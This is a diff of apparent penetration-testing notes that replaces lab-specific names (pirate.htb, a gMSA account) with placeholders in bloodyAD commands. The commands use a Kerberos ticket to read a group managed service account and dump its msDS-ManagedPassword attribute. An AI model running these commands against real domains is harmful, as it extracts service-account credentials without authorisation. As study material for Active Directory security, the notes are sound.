@@ -34,15 +34,15 @@ bloodyAD -d <domain> -u <user> -p '<password>' --host <dc-hostname> \ get search
 `bloodyAD` also allows using a Kerberos TGT previously obtained and loaded.
 
 ```bash
-bloodyAD -d pirate.htb -k --host DC01.pirate.htb \
-get object "gMSA_ADFS_prod$"
+bloodyAD -d <domain> -k --host <dc-hostname> \
+get object "<user>"
 ```
 
 2) **Retrieve the gMSA Managed Password**
 
 ```bash
-bloodyAD -d pirate.htb -k --host DC01.pirate.htb \
-get object "gMSA_ADFS_prod$" --attr msDS-ManagedPassword
+bloodyAD -d <domain> -k --host <dc-hostname> \
+get object "<user>" --attr msDS-ManagedPassword
 ```
 
 
